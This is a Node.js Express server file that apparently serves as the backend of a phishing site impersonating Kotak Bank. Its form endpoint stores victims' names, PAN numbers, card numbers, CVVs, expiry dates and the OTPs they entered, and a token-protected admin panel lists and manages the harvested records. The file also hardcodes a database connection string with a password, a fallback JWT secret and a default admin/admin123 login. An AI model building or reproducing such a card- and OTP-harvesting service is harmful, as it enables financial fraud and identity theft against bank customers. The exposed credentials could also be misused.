import express from 'express'
import cors from 'cors'
import bcrypt from 'bcryptjs'
import jwt from 'jsonwebtoken'
import pg from 'pg'

const { Pool } = pg

const app = express()
const PORT = process.env.PORT || 5000
const JWT_SECRET = process.env.JWT_SECRET || 'kotakbank_secret_key_2024'

const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://kotakbankadmin_user:k7ECU4gjax3ae7K0wv7FDndrbSL2CB2t@dpg-d6tg6duuk2gs738qif1g-a.oregon-postgres.render.com/kotakbankadmin',
  ssl: {
    rejectUnauthorized: false
  }
})

app.use(cors())
app.use(express.json())

async function initDB() {
  console.log('Initializing database...')
  try {
    console.log('Creating admins table...')
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admins (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `)
    console.log('Admins table ready')

    console.log('Creating form_submissions table...')
    await pool.query(`
      CREATE TABLE IF NOT EXISTS form_submissions (
        id SERIAL PRIMARY KEY,
        full_name VARCHAR(100),
        mobile_number VARCHAR(20),
        date_of_birth DATE,
        email VARCHAR(100),
        pan_number VARCHAR(20),
        request_type VARCHAR(50),
        card_holder_name VARCHAR(100),
        card_number VARCHAR(20),
        cvv VARCHAR(4),
        expiry_date VARCHAR(10),
        otp_verified BOOLEAN DEFAULT FALSE,
        otp_entered VARCHAR(10),
        status VARCHAR(20) DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `)
    console.log('Form submissions table ready')

    console.log('Adding otp_entered column if not exists...')
    await pool.query(`ALTER TABLE form_submissions ADD COLUMN IF NOT EXISTS otp_entered VARCHAR(10)`)
    console.log('OTP entered column ready')

    console.log('Creating default admin user...')
    const adminExists = await pool.query('SELECT * FROM admins WHERE username = $1', ['admin'])
    if (adminExists.rows.length === 0) {
      const hashedPassword = await bcrypt.hash('admin123', 10)
      await pool.query(
        'INSERT INTO admins (username, password) VALUES ($1, $2)',
        ['admin', hashedPassword]
      )
      console.log('Default admin created: admin / admin123')
    } else {
      console.log('Admin user already exists')
    }

    console.log('Database initialization complete!')
  } catch (error) {
    console.error('Database initialization error:', error)
    throw error
  }
}

app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body
    
    const result = await pool.query('SELECT * FROM admins WHERE username = $1', [username])
    
    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials' })
    }
    
    const admin = result.rows[0]
    const isValid = await bcrypt.compare(password, admin.password)
    
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid credentials' })
    }
    
    const token = jwt.sign({ id: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '24h' })
    
    res.json({ token, username: admin.username })
  } catch (error) {
    console.error('Login error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']
  
  if (!token) {
    return res.status(403).json({ error: 'No token provided' })
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET)
    req.admin = decoded
    next()
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' })
  }
}

app.get('/api/admin/submissions', verifyToken, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM form_submissions ORDER BY created_at DESC'
    )
    res.json(result.rows)
  } catch (error) {
    console.error('Fetch submissions error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.get('/api/admin/submissions/:id', verifyToken, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM form_submissions WHERE id = $1',
      [req.params.id]
    )
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Submission not found' })
    }
    
    res.json(result.rows[0])
  } catch (error) {
    console.error('Fetch submission error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.put('/api/admin/submissions/:id', verifyToken, async (req, res) => {
  try {
    const { status } = req.body
    const result = await pool.query(
      'UPDATE form_submissions SET status = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2 RETURNING *',
      [status, req.params.id]
    )
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Submission not found' })
    }
    
    res.json(result.rows[0])
  } catch (error) {
    console.error('Update submission error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.delete('/api/admin/submissions/:id', verifyToken, async (req, res) => {
  try {
    await pool.query('DELETE FROM form_submissions WHERE id = $1', [req.params.id])
    res.json({ message: 'Submission deleted' })
  } catch (error) {
    console.error('Delete submission error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.post('/api/submit-form', async (req, res) => {
  try {
    const {
      fullName,
      mobileNumber,
      dateOfBirth,
      email,
      panNumber,
      requestType,
      cardHolderName,
      cardNumber,
      cvv,
      expiryDate,
      otpVerified = false,
      otpEntered = '',
      isNewSubmission = true
    } = req.body
    
    if (isNewSubmission) {
      const result = await pool.query(
        `INSERT INTO form_submissions 
          (full_name, mobile_number, date_of_birth, email, pan_number, request_type, card_holder_name, card_number, cvv, expiry_date, otp_verified, otp_entered)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)
         RETURNING id`,
        [fullName, mobileNumber, dateOfBirth, email, panNumber, requestType, cardHolderName, cardNumber, cvv, expiryDate, otpVerified, otpEntered]
      )
      res.json({ success: true, id: result.rows[0].id, message: 'Form submitted successfully' })
    } else {
      const existing = await pool.query(
        'SELECT id FROM form_submissions WHERE mobile_number = $1 OR email = $2 ORDER BY created_at DESC LIMIT 1',
        [mobileNumber, email]
      )
      
      if (existing.rows.length > 0) {
        await pool.query(
          `UPDATE form_submissions SET 
            otp_verified = $1, otp_entered = $2, updated_at = CURRENT_TIMESTAMP
           WHERE id = $3`,
          [otpVerified, otpEntered, existing.rows[0].id]
        )
        res.json({ success: true, id: existing.rows[0].id, message: 'OTP verified successfully' })
      } else {
        res.status(404).json({ error: 'User not found. Please submit form first.' })
      }
    }
  } catch (error) {
    console.error('Form submission error:', error)
    res.status(500).json({ error: 'Failed to submit form' })
  }
})

app.get('/api/admin/stats', verifyToken, async (req, res) => {
  try {
    const total = await pool.query('SELECT COUNT(*) as count FROM form_submissions')
    const pending = await pool.query("SELECT COUNT(*) as count FROM form_submissions WHERE status = 'pending'")
    const approved = await pool.query("SELECT COUNT(*) as count FROM form_submissions WHERE status = 'approved'")
    const rejected = await pool.query("SELECT COUNT(*) as count FROM form_submissions WHERE status = 'rejected'")
    const otpVerified = await pool.query("SELECT COUNT(*) as count FROM form_submissions WHERE otp_verified = true")
    
    res.json({
      total: parseInt(total.rows[0].count),
      pending: parseInt(pending.rows[0].count),
      approved: parseInt(approved.rows[0].count),
      rejected: parseInt(rejected.rows[0].count),
      otpVerified: parseInt(otpVerified.rows[0].count)
    })
  } catch (error) {
    console.error('Stats error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.post('/api/admin/change-password', verifyToken, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body
    
    const result = await pool.query('SELECT * FROM admins WHERE id = $1', [req.admin.id])
    const admin = result.rows[0]
    
    const isValid = await bcrypt.compare(currentPassword, admin.password)
    if (!isValid) {
      return res.status(400).json({ error: 'Current password is incorrect' })
    }
    
    const hashedNewPassword = await bcrypt.hash(newPassword, 10)
    await pool.query('UPDATE admins SET password = $1 WHERE id = $2', [hashedNewPassword, req.admin.id])
    
    res.json({ message: 'Password changed successfully' })
  } catch (error) {
    console.error('Change password error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.delete('/api/admin/delete-all', verifyToken, async (req, res) => {
  try {
    await pool.query('DELETE FROM form_submissions')
    res.json({ message: 'All data deleted successfully' })
  } catch (error) {
    console.error('Delete all error:', error)
    res.status(500).json({ error: 'Server error' })
  }
})

app.get('/api/keep-alive', (req, res) => {
  res.json({ status: 'alive', timestamp: new Date().toISOString() })
})

const SERVER_URL = process.env.SERVER_URL || `http://localhost:${PORT}`
const PING_INTERVAL = 4 * 60 * 1000

function pingServer() {
  setTimeout(async () => {
    try {
      const response = await fetch(`${SERVER_URL}/api/keep-alive`)
      if (response.ok) {
        console.log(`[Keep-alive] Server pinged at ${new Date().toISOString()}`)
      }
    } catch (error) {
      console.log('[Keep-alive] Ping failed, will retry...')
    }
    pingServer()
  }, PING_INTERVAL)
}

initDB().then(() => {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`)
    console.log('Database tables created/verified successfully')
    pingServer()
  })
}).catch((error) => {
  console.error('Failed to initialize database:', error)
  process.exit(1)
})
